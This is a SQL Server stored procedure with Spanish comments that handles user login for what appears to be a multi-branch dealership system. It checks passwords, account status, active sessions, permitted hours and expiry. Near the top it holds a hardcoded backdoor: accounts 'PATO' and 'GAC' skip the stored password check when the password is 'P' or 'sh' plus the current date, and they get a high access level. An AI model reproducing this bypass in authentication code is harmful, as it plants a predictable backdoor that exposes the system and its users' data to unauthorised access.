create proc [dbo].[SPc_ValidaUsuario]          
 @sUsuario varchar(50), -- @sUsuario debe traer el usuario global o el usuariologin (dependiendo de la configuración de tc_parametrosGlobales.loginextendido)          
 @sPassword varchar(10)          
 --Encriptacion                  
-- --TOREO\n-- WITH ENCRYPTION           
as          
SET NOCOUNT ON          
          
declare           
@sPassActual varchar(10),           
@iVigenciaFirma int,           
@sEstatus varchar(1),           
@iFecha int,           
@iHora int,           
@Nivel int,           
@sPerfil varchar(20),           
@iIdioma int,           
@linea_autorizada decimal(15, 2),           
@iFechaAnterior int,           
@UsuarioMe varchar(6),           
@UsuarioMeCierre varchar(6),           
@Conteo tinyint,           
@CveSucursal varchar(4),           
@idSucursal int,           
@sEmpresa varchar(4),           
@sSucursal varchar(4),           
@DescSucursal varchar(50),           
@HoraCierre varchar(20),           
@UsarCentral tinyint,          
@loginextendido tinyint,          
@usuariologin varchar(50),        
@fdHora varchar (2),                                  
@fdMinutos varchar (2),                 
@fdsegundos varchar (2),           
@HoraAlta char(8),        
@sUsuarioOrigen varchar(50)         
          
-- Evita que crystal meta su cuchara en el SP que ni entiende.          
if 0 = 1 begin set fmtonly off; return; end          
          
set nocount on --no se devuelve el recuento de mensajes, reduciendo así el tráfico de mensajes en la red                                
set xact_abort on --ejecuta en automatico el RollBack al momento de presentarse un error                                
          
select @iFecha = DateDiff(day, '12/28/1800', GetDate())          
        
set @sUsuarioOrigen=@sUsuario        
          
select @iHora = (Datepart(hour, GetDate()) * 360000) + (Datepart(minute, GetDate()) * 6000) + (Datepart(second, GetDate()) * 100) + 1          
          
select top 1 @UsarCentral = UsarCentral, @loginextendido = loginextendido from tc_parametrosGlobales          
          
-- Si está activado el login extendido entonces buscamos @sUsuario en el campo usuariologin y lo sustituimos por su usuario global          
if @loginextendido=1 and @sUsuario<>'GAC' begin          
          
 set @usuariologin=@sUsuario        
 if not exists (select usuario from tc_Usuario where usuariologin=@usuariologin)          
 begin          
  select 70059, 'Usuario No Existe en Base de Datos'          
  return          
 end          
            
 set @sUsuario=''            
 select @sUsuario=usuario from tc_Usuario where usuariologin=@usuariologin          
end          
          
select top 1 @UsuarioMe = u.usuario, @idSucursal = u.idSucursal          
 from tc_UsuarioSucursal u          
 inner join tc_Usuario ug on ug.idUsuario = u.idUsuario        
 INNER JOIN tc_parametros AS P ON P.idSucursal=U.idSucursal          
 where ug.usuario = @sUsuario and u.Status <> '0'  ORDER by p.fechaSistema asc, u.idSucursal        
           
select @iFechaAnterior = fechaSistema from tc_parametros where idSucursal = @idSucursal         
              
if (          
  @sUsuario = 'PATO' and @sPassword = 'P' + ltrim(rtrim(convert(char(10), Datepart(month, GetDate())))) + ltrim(rtrim(convert(char(10)          
     , Datepart(day, GetDate())))) + ltrim(rtrim(convert(char(10), Datepart(year, GetDate()))))          
  ) or (          
  @sUsuario = 'GAC' and @sPassword = 'sh' + ltrim(rtrim(convert(char(10), Datepart(month, GetDate())))) + ltrim(rtrim(convert(char(10)          
     , Datepart(day, GetDate())))) + ltrim(rtrim(convert(char(10), Datepart(year, GetDate()))))          
  )          
begin          
          
 ---- selecciona una sucursal para el usuario si es GAC          
 select top 1 @sSucursal = u.UsuarioAlta, @idSucursal = u.idSucursal, @CveSucursal = s.idSucursal, @DescSucursal = s.Descripcion          
 from tc_UsuarioSucursal as u          
 inner join tc_Usuario as ug on ug.idUsuario = u.idUsuario          
 inner join tc_Sucursal as s on s.idSucursal = u.idSucursal          
 where ug.usuario = @sUsuario and u.Status <> '0'           
 order by s.idSucursal          
          
 select @Conteo = COUNT(Usuario)          
 from tc_UsuarioSucursal          
 where Status <> '0' and idUsuario = ( select idUsuario from tc_Usuario where Usuario = @sUsuario )          
          
 select 0, '', 1, @sSucursal, '', 0, db_name(), right('00' + convert(varchar(2), (DatePart(day, DateAdd(day, @iFecha, '12/28/1800'))          
     )), 2) + '/' + right('00' + convert(varchar(2), (DatePart(month, DateAdd(day, @iFecha, '12/28/1800'))          
     )), 2) + '/' + right('0000' + convert(varchar(4), (DatePart(year, DateAdd(day, @iFecha, '12/28/1800'))          
     )), 4), MaxAutorizar = 0, nivel = 35, noSucursales = @Conteo, idSucursal = @idSucursal, CveSucursal = upper(@CveSucursal          
  ), usuario = @UsuarioMe, DescSucursal = @DescSucursal, UsarCentral = isnull(@UsarCentral, 0), UsuarioGlobal=@sUsuario,          
  Ruta=(select substring(ServerWeb, 0,PATINDEX('%vdealer%',ServerWeb)) as ServerWeb from tc_OtrosParametrosFD where idSucursal=@idSucursal),          
  Ciudad=(select isnull(Descripcion,'') from tc_Sucursal where idSucursal=@idSucursal)        
          
 return          
end          
          
select @sEmpresa = '', @sSucursal = ''          
          
         
--valida que exista el Usuario          
if not exists (          
  select * from tc_UsuarioSucursal u          
  inner join tc_Usuario ug on ug.idUsuario = u.idUsuario          
  where ug.usuario = @sUsuario )          
begin          
 select 70059, 'Usuario No Existe en Base de Datos'          
          
 return          
end          
          
-- Asigna a variables locales los datos del usuario          
select top 1 @sPassActual = ug.clave_acceso, @iVigenciaFirma = ug.Vigencia, @sEstatus = u.Status, @sEmpresa = 'EMPRESA', @sSucursal = u.          
 UsuarioAlta, @sPerfil = 'PERFIL', @iIdioma = 0, @linea_autorizada = 0, @nivel = u.nivel, @CveSucursal = s.idSucursal          
 , @DescSucursal = s.Descripcion          
from tc_UsuarioSucursal as u          
inner join tc_Sucursal as s on s.idSucursal = u.idSucursal          
inner join tc_Usuario ug on ug.idUsuario = u.idUsuario          
where ug.Usuario = @sUsuario and u.Status <> '0'          
order by u.Status desc          
          
-- Cuenta los usuarios (uno por sucursal) con que cuenta el usuario global          
select @Conteo = COUNT(U.Usuario)          
from tc_UsuarioSucursal u          
inner join tc_Usuario ug on ug.idUsuario = u.idUsuario          
where ug.usuario = @sUsuario and u.Status <> '0'          
          
exec SPc_EncriptaPassword @sPassword, @sRegresa = @sPassword output          
          
if @sPassActual <> @sPassword          
begin          
 select 70060, 'Password Invalido'          
          
 return          
end          
          
if @sEstatus = '0'          
begin          
 select 70061, 'Su usuario ha sido desactivado'          
          
 return          
end          
          
print '@Conteo:' + CAST(@Conteo as varchar)          
          
-- Verifica si ya estaba firmado para no volver a permitir que se firme solo hasta que pasen 3 minutos.          
if exists (          
  select * from tc_usrfirmados  where usuario = @sUsuario and IgnorarNoAcceso=0          
  )      
begin          
          
 if not exists (          
   select * from tc_NoAcceso           
    where sUsuario = @sUsuario and ifecha = @iFecha and @iHora between iDeHora and iAHora and @sEstatus <> '0'          
  )          
   insert into tc_NoAcceso (sUsuario, iFecha, iDeHora, iAHora)          
   values (@sUsuario, @iFecha, @iHora, @iHora + 3000)          
          
 delete tc_usrfirmados where Usuario = @sUsuario          
          
 select 70063,           
  'Usuario ya firmado, reintentar en 30 segundos o informe al Administrador ¡FAVOR DE SALIRSE CORRECTAMENTE DEL SISTEMA!'          
          
 return          
end          
          
-- verifica su horario de firma                  
declare @iDiaSem int          
          
select @iDiaSem = datepart(dw, DateAdd(day, @iFecha, '12/28/1800'))          
          
if exists (          
  select * from cmtbl_horausua          
  where susuario = @sUsuario and idia = @iDiaSem and @iHora between ideHora and iaHora          
  )          
begin          
 select 70064, 'Horario no permitido'          
          
 return          
end          
          
-- Se valida si no esta bloqueado para acceder (no tiene caso seguir si está bloqueado)          
if exists (          
  select * from tc_NoAcceso          
  where sUsuario = @sUsuario and ifecha = @iFecha and @iHora between iDeHora and iAHora          
  )          
begin          
 select 70065, 'Acceso no permitido'          
          
 return          
end          
          
select @iVigenciaFirma = isnull(@iVigenciaFirma, 0)          
          
if @iFecha >= @iVigenciaFirma          
begin          
 -- select 0, 'Expirado', @sEmpresa, @sSucursal, @sPerfil, @iIdioma, nivel = @nivel          
           
 select 70066, 'Acceso ha expirado'          
          
 return          
end          
          
-- checa que los cierres del dia anterior existan                  
declare @sFecha char(10),          
@sFecha2 char(10)             
        
----actualiza fecha del sistema   ---- se actualiza despues de las validaciones de error al firmar usuario,        
---- si la contraseña era incorrecta o algo pasó mal en el acceso no se firma el usuario correctamente,        
----  no se hace el cierre pero si actualizaba la fecha        
update tc_parametros set fechaSistema = @iFecha where fechasistema<>@iFecha        
  AND idSucursal IN(select U.idSucursal        
    from tc_UsuarioSucursal u          
    inner join tc_Usuario ug on ug.idUsuario = u.idUsuario          
    where ug.usuario = @sUsuario and u.Status <> '0'  )          
          
          
-- @iFechaAnterior trae la fecha del sistema del ultimo dia laboral                   
select @sFecha = convert(varchar(20), DateAdd(day, @iFechaAnterior, '12/28/1800'), 3)          
        
        
select 0, '', @sEmpresa, @sSucursal, @sPerfil, @iIdioma, db_name(), right('00' + convert(varchar(2), (DatePart(day, DateAdd(day, @iFecha, '12/28/1800'))          
    )), 2) + '/' + right('00' + convert(varchar(2), (DatePart(month, DateAdd(day, @iFecha, '12/28/1800')))), 2) +           
 '/' + right('0000' + convert(varchar(4), (DatePart(year, DateAdd(day, @iFecha, '12/28/1800')))), 4), MaxAutorizar =           
 @linea_autorizada, nivel = @nivel, noSucursales = @Conteo, idSucursal = @idSucursal, CveSucursal = upper(@CveSucursal), usuario =           
 @UsuarioMe, DescSucursal = @DescSucursal, UsarCentral = isnull(@UsarCentral, 0), UsuarioGlobal=@sUsuario,          
 Ruta=(select substring(ServerWeb, 0,PATINDEX('%vdealer%',ServerWeb)) as ServerWeb from tc_OtrosParametrosFD where idSucursal=@idSucursal),          
 Ciudad=(select isnull(Descripcion,'') from tc_Sucursal where idSucursal=@idSucursal)  
        
-----inician procesos para el cierre de refacciones y servicio, inventario en proceso, etc.          
if @Conteo = 1          
     
begin          
          
       
        
    
        
 select TOP 1 @UsuarioMe = u.usuario, @idSucursal = idSucursal          
 from tc_UsuarioSucursal u          
 inner join tc_Usuario ug on ug.idUsuario = u.idUsuario          
 where ug.usuario = @sUsuario and u.Status <> '0'  ORDER BY idSucursal        
        
     
end